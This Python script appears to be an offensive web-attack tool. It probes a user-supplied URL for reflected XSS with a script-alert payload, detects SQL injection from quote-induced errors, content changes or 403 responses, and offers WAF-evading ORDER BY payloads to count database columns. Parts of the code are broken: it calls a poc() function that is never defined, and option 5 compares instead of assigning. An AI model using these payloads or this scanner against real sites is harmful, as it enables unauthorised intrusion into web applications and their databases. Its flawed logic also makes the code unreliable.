import time,os
import requests as r

CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0m"     # White
R = "\033[31m"    # Red
C = "\033[36m"    # Cyan
user="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36"
head={"User-Agent":user}

def notequal(url,order):
  key="\'"
  req_main=r.get(url+key,headers=head)
  for i in range(1,9999999999999999):
   order_url=url+order+str(i)+"--+-"
   req_order=r.get(order_url,headers=head).content
   if req_order!=req_main.content:
     pass
   else:
    order_n=i-1
    print(f"{R}[alert] {order_n} Columns{W}")
    poc()
    break
    
def syntax(url,order):
  for i in range(1,9999999999999999):
    order_url=url+order+str(i)+"--+-"
    k=r.get(order_url,headers=head)
    if "order clause" in k.text:
      order_n=i-1
      print(f"{R}[alert] {order_n} Columns{W}")
      poc()
      break
    else:
    	pass 
   
	 
		
def sqliorder(url,n):
  print(Y)
  a="+ORDER+BY+"
  b="/**/ORDER/**/BY/**/"
  c="+/*!12345ORDER*/+/*!12345BY*/"
  d="/*!50000ORDER*//*!50000BY/**_**/*/"
  e="%23%0AORDER%23%0ABY%23%0A"  
  print(C+"---[ Order by ]----"+Y)
  print(f"[1] {a}")
  print(f"[2] {b}")
  print(f"[3] {c}")
  print(f"[4] {d}")
  print(f"[5] {e}")
  print(G)
  x=int(input("[+] Enter payload choice :: "))
  if x==1:
    order=a
  elif x==2:
    order=b
  elif x==3:
   order=c
  elif x==4:
  	order=d
  elif x==5:
  	order==e
  if 0<x<6:
    if n==2 or n==3:
    	notequal(url,order)
    elif n==1:
      syntax(url,order)
  else:
  	print(f"{R}[warning] Incorrect choice ")

   
   
  
	

def sqlivulncheck(url):
  key="\'"
  c1=r.get(url,headers=head)
  c2=r.get(url+key,headers=head)
  st=c2.status_code
  vuln=False
  print(f"{G}[info] Vulnerbility scanning...")
  time.sleep(2)
  url_split=url.split("=")
  pay="<script>alert(8);</script>"
  xss_url=url_split[0]+"="+pay
  xss_req=r.get(xss_url,headers=head).text
  if pay in xss_req:
   print(f'{R}[warning] Xss Vulnerable')
  else:
    print(f"{Y}[alert] Xss not vulnerable")
  if "SQL" in c2.text:
    if c1.text != c2.text:
     print(f'{R}[warning] Sqli Vulnerable')
     print(f"{G}[info] SQL error  found")
     sqliorder(url,1)
  elif  len(c1.text) > len(c2.text):
  	print(f'{R}[warning] Sqli Vulnerable')
  	print(f"{G}[info] Content missing ")
  	sqliorder(url,2)
  elif st==403:
  	print(f'{R}[warning] Sqli Vulnerable')
  	print(f"{G}[info] WAF find [403] ")
  	sqliorder(url,3)
  else:
   print(f"{Y}[alert] Sqli not vulnerable")
          	
def sqlicheck():  # URL check
  print(Y)
  os.system("figlet Sqli")
  print(f"{C}Find number of Cloumn{W}")
  url=input(f"\n{B}[+] Enter Url : {W}")
  print(f"\n{W}[~] Url Checking  : {url}")
  flag_url=False
  try:
    responce=r.get(url,headers=head)
    print(f"[~] Status code : {G}{responce.status_code}{W}")
    flag_url=True
  except Exception as e:
    time.sleep(2)
    print(R)
    print(f"{R}[•] Unable to connect ...")
    pass
  if flag_url ==True:
  	sqlivulncheck(url)
    
